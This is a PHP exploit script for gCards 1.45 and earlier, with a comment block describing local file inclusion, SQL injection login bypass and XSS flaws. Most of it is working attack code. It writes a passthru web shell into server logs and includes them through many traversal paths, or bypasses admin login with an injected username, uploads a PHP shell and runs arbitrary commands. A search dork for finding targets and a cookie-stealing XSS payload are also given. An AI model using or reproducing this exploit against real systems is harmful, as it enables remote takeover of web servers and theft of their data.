<pre>
<code><span style="font: 10pt Courier New;"><span class="general1-string">#!/usr/bin/php -q -d short_open_tag=on
&lt;?
echo &quot;gCards &lt;= 1.45 multiple vulnerabilities\r\n&quot;;
echo &quot;by rgod rgod@autistici.org\r\n&quot;;
echo &quot;site: http://retrogod.altervista.org\r\n\r\n&quot;;
echo &quot;Sun-Tzu:\&quot;At first, then, exhibit the coyness of a maiden, until the\r\n&quot;;
echo &quot;enemy gives you an opening; afterwards emulate the rapidity of a\r\n&quot;;
echo &quot;running hare, and it will be too late for the enemy to oppose you.\&quot;\r\n&quot;;

echo &quot;dork: \&quot;powered by gcards\&quot;\r\n\r\n&quot;;

/*

explaination:
software site: http://www.gregphoto.net/gcards/index.php

i) vulnerable code in inc/setLang.php:

&lt;?
	if ($page-&gt;languageredirect == $_SERVER['PHP_SELF']) {
		if (isset($_GET['setLang'])) $_SESSION['setLang'] = $_GET['setLang'];
	}

	$langFile = $page-&gt;relpath.'inc/lang/'.$lang[$_SESSION['setLang']]['file'];

	if (file_exists($langFile)) {
		include_once($langFile);
	}
	else {
		echo &quot;Could not find language file $langFile&quot;;
	}
?&gt;

this code is included by main script, so ... arbitrary local inclusion, poc:

http://[target]/[path]/index.php?setLang=suntzu&amp;lang[suntzu][file]=../../../../../../../../../../../var/log/httpd/access_log

this works regardless of any magic_quotes_gpc settings, apart open_basedir
restrictions obviously

ii) also we have SQL injection in admin authentication procedure, admin/loginfunction.php
at lines 28-38:

...
	$username = $_POST['username'];
	$userpass = $_POST['userpass'];
	if ($username &amp;&amp; $userpass)
	{
		include('../inc/adodb/adodb.inc.php');	   # load code common to ADOdb
		include('../config.php');
		$ADODB_FETCH_MODE = ADODB_FETCH_ASSOC;
		$conn = &amp;ADONewConnection('mysql');	# create a connection
		$conn-&gt;Connect($dbhost,$dbuser,$dbpass,$dbdatabase);
		$pass = md5($userpass);
		$sqlstmt = &quot;SELECT role FROM &quot;.$tablePrefix.&quot;cardusers WHERE username='$username' AND userpass='$pass'&quot;;
...

login as admin typing:

username: 'or'suntzu'='suntzu'/*
password: [whatever]

this works with magic_quotes_gpc=Off

once you are admin, you can upload php files, files are renamed but gcards keep
php extension, so you can launch commands from them

iii)xss:

http://[target]/[path]/index.php?setLang=suntzu&amp;lang[suntzu][file]=%3Cscript%3Ealert(document.cookie)%3C/script%3E

this exploit does the dirty work for i) and ii)

                                                                              */
if ($argc&lt;5) {
echo &quot;Usage: php &quot;.$argv[0].&quot; host path action cmd OPTIONS\r\n&quot;;
echo &quot;host:      target server (ip/hostname)\r\n&quot;;
echo &quot;path:      path to gcards\r\n&quot;;
echo &quot;action:    1 - launch commands through arbitrary local inclusion\r\n&quot;;
echo &quot;               (no php.ini restriction)\r\n&quot;;
echo &quot;           2 - launch commands through sql injection/admin auth bypass\r\n&quot;;
echo &quot;               (works with magic_quotes_gpc = Off\r\n&quot;;
echo &quot;cmd:       a shell command\r\n&quot;;
echo &quot;Options:\r\n&quot;;
echo &quot;   -p[port]:    specify a port other than 80\r\n&quot;;
echo &quot;   -P[ip:port]: specify a proxy\r\n&quot;;
echo &quot;Examples:\r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /gcards/ 2 cat ./../config.php\r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /gcards/ 1 cat config.php\r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /gcards/ 1 cat config.php -p81\r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /gcards/ 1 cat config.php -P1.1.1.1:80\r\n&quot;;
die;
}

error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i&lt;=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) &lt;= 32 ) | (ord($string[$i]) &gt; 126 ))
   {$result.=&quot;  .&quot;;}
   else
   {$result.=&quot;  &quot;.$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=&quot; &quot;.dechex(ord($string[$i]));}
   else
   {$exa.=&quot; 0&quot;.dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.=&quot;\r\n&quot;; $exa.=&quot;\r\n&quot;;}
  }
 return $exa.&quot;\r\n&quot;.$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo &quot;Connecting to &quot;.$parts[0].&quot;:&quot;.$parts[1].&quot; proxy...\r\n&quot;;
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo &quot;\r\n&quot;.$html;
}

function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host=$argv[1];
$path=$argv[2];
$action=$argv[3];
$cmd=&quot;&quot;;$port=80;$proxy=&quot;&quot;;

for ($i=4; $i&lt;=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp&lt;&gt;&quot;-p&quot;) and ($temp&lt;&gt;&quot;-P&quot;))
{$cmd.=&quot; &quot;.$argv[$i];}
if ($temp==&quot;-p&quot;)
{
  $port=str_replace(&quot;-p&quot;,&quot;&quot;,$argv[$i]);
}
if ($temp==&quot;-P&quot;)
{
  $proxy=str_replace(&quot;-P&quot;,&quot;&quot;,$argv[$i]);
}
}
$cmd=urlencode($cmd);

if (($path[0]&lt;&gt;'/') or ($path[strlen($path)-1]&lt;&gt;'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

echo &quot;action selected -&gt; &quot;.$action.&quot;\r\n&quot;;
if ($action==&quot;1&quot;)
{
  echo &quot;[1] Injecting some code in log files...\r\n&quot;;
  $CODE ='&lt;?php ob_clean();echo 666;if (get_magic_quotes_gpc()) {$_GET[cmd]=striplashes($_GET[cmd]);}';
  $CODE.='passthru($_GET[cmd]);echo 666;die;?&gt;';
  $packet.=&quot;GET &quot;.$p.$CODE.&quot; HTTP/1.1\r\n&quot;;
  $packet.=&quot;User-Agent: &quot;.$CODE.&quot;\r\n&quot;;
  $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
  $packet.=&quot;Connection: close\r\n\r\n&quot;;
  #debug
  #echo quick_dump($packet);
  sendpacketii($packet);

  # fill with possible locations
  $paths= array (
  &quot;../../../../../../../../../../var/log/httpd/access_log&quot;,
  &quot;../../../../../../../../../../var/log/httpd/error_log&quot;,
  &quot;../apache/logs/error.log&quot;,
  &quot;../apache/logs/access.log&quot;,
  &quot;../../apache/logs/error.log&quot;,
  &quot;../../apache/logs/access.log&quot;,
  &quot;../../../apache/logs/error.log&quot;,
  &quot;../../../apache/logs/access.log&quot;,
  &quot;../../../../apache/logs/error.log&quot;,
  &quot;../../../../apache/logs/access.log&quot;,
  &quot;../../../../../../../../../../etc/httpd/logs/acces_log&quot;,
  &quot;../../../../../../../../../../etc/httpd/logs/acces.log&quot;,
  &quot;../../../../../../../../../../etc/httpd/logs/error_log&quot;,
  &quot;../../../../../../../../../../etc/httpd/logs/error.log&quot;,
  &quot;../../../../../../../../../../var/www/logs/access_log&quot;,
  &quot;../../../../../../../../../../var/www/logs/access.log&quot;,
  &quot;../../../../../../../../../../usr/local/apache/logs/access_log&quot;,
  &quot;../../../../../../../../../../usr/local/apache/logs/access.log&quot;,
  &quot;../../../../../../../../../../var/log/apache/access_log&quot;,
  &quot;../../../../../../../../../../var/log/apache/access.log&quot;,
  &quot;../../../../../../../../../../var/log/access_log&quot;,
  &quot;../../../../../../../../../../var/www/logs/error_log&quot;,
  &quot;../../../../../../../../../../var/www/logs/error.log&quot;,
  &quot;../../../../../../../../../../usr/local/apache/logs/error_log&quot;,
  &quot;../../../../../../../../../../usr/local/apache/logs/error.log&quot;,
  &quot;../../../../../../../../../../var/log/apache/error_log&quot;,
  &quot;../../../../../../../../../../var/log/apache/error.log&quot;,
  &quot;../../../../../../../../../../var/log/access_log&quot;,
  &quot;../../../../../../../../../../var/log/error_log&quot;
  );

  for ($i=0; $i&lt;=count($paths)-1; $i++)
  {
    $j=$i+2;
    echo &quot;[&quot;.$j.&quot;] Trying with &quot;.$paths[$i].&quot;\r\n&quot;;
    $xpl=urlencode($paths[$i]);
    $packet =&quot;GET &quot;.$p.&quot;index.php?cmd=&quot;.$cmd.&quot;&amp;setLang=suntzu&amp;lang[suntzu][file]=&quot;.$xpl.&quot; HTTP/1.0\r\n&quot;;
    $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
    $packet.=&quot;Connection: Close\r\n\r\n&quot;;
    #debug, shows packets in a nice format
    #echo quick_dump($packet);
    sendpacketii($packet);

    if (strstr($html,&quot;666&quot;)){
      echo &quot;Exploit succeeded...\r\n&quot;;
      $temp=explode(&quot;666&quot;,$html);
      echo $temp[1];
      die;
    }
  }

}
else
if ($action==&quot;2&quot;)
{   echo &quot;[1] Injecting some SQL statements in admin login username field...\r\n&quot;;
    $sql=urlencode(&quot;'or'suntzu'='suntzu'/*&quot;);
    $data=&quot;username=&quot;.$sql;
    $data.=&quot;&amp;userpass=suntzu&quot;;
    $packet =&quot;POST &quot;.$p.&quot;admin/admin.php HTTP/1.1\r\n&quot;;
    $packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
    $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
    $packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
    $packet.=&quot;Connection: Close\r\n\r\n&quot;;
    $packet.=$data;
    #echo quick_dump($packet);
    sendpacketii($packet);
    if (strstr($html,&quot;gCards Administration Console&quot;))
    {echo &quot;Sql injection succeeded...\r\n&quot;;}
    else
    {die(&quot;Not succeeded, maybe we have magic_quotes_gpc on here...\r\n&quot;);}
    $temp=explode(&quot;Set-Cookie: &quot;,$html);
    $temp2=explode(&quot; &quot;,$temp[1]);
    $cookie=$temp2[0];
    echo &quot;Cookie -&gt; &quot;.$cookie.&quot;\r\n&quot;;
    echo &quot;[2] Let's retrieve a category name to upload a file in ...\r\n&quot;;
    $packet =&quot;GET &quot;.$p.&quot;admin/cards.php HTTP/1.1\r\n&quot;;
    $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
    $packet.=&quot;Cookie: &quot;.$cookie.&quot;\r\n&quot;;
    $packet.=&quot;Connection: Close\r\n\r\n&quot;;
    #echo quick_dump($packet);
    sendpacketii($packet);
    $temp=explode(&quot;&lt;option value=\&quot;&quot;,$html);
    $temp2=explode(&quot;\&quot;&quot;,$temp[1]);
    $catid=$temp2[0];
    echo &quot;catid -&gt; &quot;.$catid.&quot;\r\n&quot;;
    if ($catid==&quot;&quot;) {$catid=1;}
    echo &quot;[3] Uploading a php file...\r\n&quot;;
$data='-----------------------------7d613b1d0448
Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;

250000
-----------------------------7d613b1d0448
Content-Disposition: form-data; name=&quot;cardname&quot;

suntzu
-----------------------------7d613b1d0448
Content-Disposition: form-data; name=&quot;catid&quot;

'.$catid.'
-----------------------------7d613b1d0448
Content-Disposition: form-data; name=&quot;userfile&quot;; filename=&quot;suntzu.php&quot;
Content-Type: application/octet-stream

&lt;?php echo 666;ini_set(&quot;max_execution_time&quot;,0);passthru($_GET[cmd]);echo 666;?&gt;
-----------------------------7d613b1d0448
Content-Disposition: form-data; name=&quot;userthumb&quot;; filename=&quot;suntzu.php&quot;
Content-Type: application/octet-stream

&lt;?php echo 666;ini_set(&quot;max_execution_time&quot;,0);passthru($_GET[cmd]);echo 666;?&gt;
-----------------------------7d613b1d0448
Content-Disposition: form-data; name=&quot;submit&quot;

Upload
-----------------------------7d613b1d0448
';
    $packet =&quot;POST &quot;.$p.&quot;admin/upload.php HTTP/1.1\r\n&quot;;
    $packet.=&quot;Content-Type: multipart/form-data; boundary=---------------------------7d613b1d0448\r\n&quot;;
    $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
    $packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
    $packet.=&quot;Connection: Close\r\n&quot;;
    $packet.=&quot;Cookie: &quot;.$cookie.&quot;\r\n\r\n&quot;;
    $packet.=$data;
    #echo quick_dump($packet);
    sendpacketii($packet);
    if (strstr($html,&quot;successfully&quot;))
    {echo &quot;Succeeded...\r\n&quot;;}
    else
    {die(&quot;For some reason...Not succeeded\r\n&quot;);}
    echo &quot;[4] Let's retrieve the new filename ...\r\n&quot;;
    $packet =&quot;GET &quot;.$p.&quot;admin/cards.php HTTP/1.1\r\n&quot;;
    $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
    $packet.=&quot;Cookie: &quot;.$cookie.&quot;\r\n&quot;;
    $packet.=&quot;Connection: Close\r\n\r\n&quot;;
    #echo quick_dump($packet);
    sendpacketii($packet);
    $temp=explode(&quot;suntzu.php&quot;,$html);
    $temp2=explode(&quot;&lt;td&gt;&quot;,$temp[count($temp)-2]);
    $temp=$temp2[count($temp2)-1];
    $newfile=$temp.&quot;suntzu.php&quot;;
    if ($newfile==&quot;&quot;) {die(&quot;For some reason, exploit failed...&quot;);}
    echo &quot;File renamed to: &quot;.$newfile.&quot;\r\n&quot;;
    echo &quot;[5] Launch commands ...\r\n&quot;;
    $packet =&quot;GET &quot;.$p.&quot;images/&quot;.$newfile.&quot;?cmd=&quot;.$cmd.&quot; HTTP/1.1\r\n&quot;;
    $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
    $packet.=&quot;Connection: Close\r\n\r\n&quot;;
    #echo quick_dump($packet);
    sendpacketii($packet);
    if (strstr($html,&quot;666&quot;))
     {
       echo &quot;Exploit succeeded...\r\n&quot;;
       $temp=explode(&quot;666&quot;,$html);
       echo $temp[1];
       die;
     }
}
else
{die (&quot;Wrong action...\r\n&quot;);}
//if you are here...
echo &quot;Exploit failed...\r\n&quot;;
?&gt;




</span></span>
</code></pre>
